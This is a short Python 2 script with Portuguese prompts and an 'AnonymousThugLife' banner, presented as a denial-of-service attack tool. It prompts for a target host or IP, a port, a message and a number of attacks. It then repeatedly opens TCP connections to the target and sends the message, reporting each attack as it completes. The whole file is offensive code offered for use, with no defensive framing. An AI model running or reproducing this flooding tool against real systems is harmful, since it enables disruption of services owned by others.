
import time
import socket
import os
import sys
import string

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
os.system("clear")
print """ \033[1;32m 
                                10100111010101010101010
                         101010010010011101010100100010010001010
                     0101001010101010010101010101001010000100111100
                        11101101010010101010100101001001010101
                          1010100101010100101010101101
                              10101010101010101010101
                                 10010011010010010      101001010100
                10100100100110      11001010010101     10010010010101
               1010010101010010   100101001001001   1010101010100101
               1010010010010100100101010101011 1101010100101
                                  1010101010101010
                                 10 101010101010101 10
              10101          101010101010101001010101010101001010011101
             10101010101010101001010101010101001110101010010101010101010
             1010101001001110101010101010101010101010010101010100101011
             0101010101001010101010101010101010101010101010101110100101
               000010101010010010010101010010101100101010101010101010
                  1010101010011001001001010101010111010100
                      1111010101010101001010101010101010101001    01
                1 0    0101010101010  10101010   101010101010    110
                 101     010101010111            010100          001
                  0110                                         0011
                   110011                0000              010 100
                    01010100101101010100      1010110100100  110
                      101010101010100010101001010101001    1100
                       1011010101010             11010101 1010
                        1010101010011          1010101010011
                          101010100101        101010100101
                           10101010101        10101010101
                              10101010        010101010
                                101011        1010100
                                   110        100

                                  
                                  
                                  #AnonymousThugLife

\033[1;32m"""


print "\033[1;36mLifeAuthor : @AnonymoThugLife\033[1;36m"
print "GitHub : https://github.com/AnonymoThugLife"
print
host=raw_input( "Digite o Site ou IP: " )
port=input( "Porta: " )
message=raw_input( "Mensagem para enviar: " )
conn=input( "Numeros(s) de Ataque(s): " )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[IP Trancado]" )
print ( "[Atacando " + host + "]" )
print ("+---------ThugLife-----------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("| --[Ataque Falhou]--|")
    print ( "\033[0;m\033[1;46m|-----------[@Ataque Conluido@]-----------|\033[0;m")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+---------ThugLife-----------+")
print("Attack(s) Finished")
if __name__ == "__main__":
    answer = raw_input("Sair?(S) ")
    if answer.strip() in "s S sim Sim SIM".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
